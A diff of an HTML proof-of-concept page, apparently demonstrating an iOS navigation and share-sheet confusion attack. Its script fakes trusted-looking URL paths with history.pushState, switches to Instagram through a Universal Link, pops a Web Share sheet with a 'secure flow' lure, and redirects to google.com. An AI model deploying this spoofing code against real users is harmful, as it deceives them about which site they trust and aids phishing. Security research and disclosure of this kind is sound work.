@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
 <meta charset="utf-8">
-<title>iOS App Confusion PoC</title>
+<title>iOS App → Share → Navigation PoC</title>
 <meta name="viewport" content="width=device-width,initial-scale=1">
 
 <style>
@@ -22,26 +22,41 @@ button {
 
 <body>
 
-<button id="start">Open Secure Content</button>
+<button id="go">Continue</button>
 
 <script>
-document.getElementById('start').onclick = () => {
+document.getElementById('go').onclick = async () => {
 
-  /* Step 1: Fake trusted-looking path */
-  history.pushState({}, '', '/google/security/check');
+  /* Step 1: Trusted-looking in-page state */
+  history.pushState({}, '', '/secure/continue');
 
-  /* Step 2: Open app via Universal Link (Instagram as example) */
+  /* Step 2: Open app via Universal Link (iOS native) */
   location.href = 'https://www.instagram.com/instagram/';
 
-  /* Step 3: Quickly navigate to trusted site */
+  /* Step 3: While context switching, queue Share Sheet */
+  setTimeout(async () => {
+    if (navigator.share) {
+      try {
+        await navigator.share({
+          title: 'Continue',
+          text: 'Sharing from a secure flow.',
+          url: location.href
+        });
+      } catch (e) {
+        // user cancelled
+      }
+    }
+  }, 120);
+
+  /* Step 4: Final navigation to trusted site */
   setTimeout(() => {
     location.replace('https://www.google.com');
-  }, 120);
+  }, 350);
 };
 
-/* Step 4: When page is shown again (return from app) */
+/* Step 5: When returning from app / share */
 window.addEventListener('pageshow', () => {
-  history.replaceState({}, '', '/google/security/check');
+  history.replaceState({}, '', '/secure/continue');
 });
 </script>
 
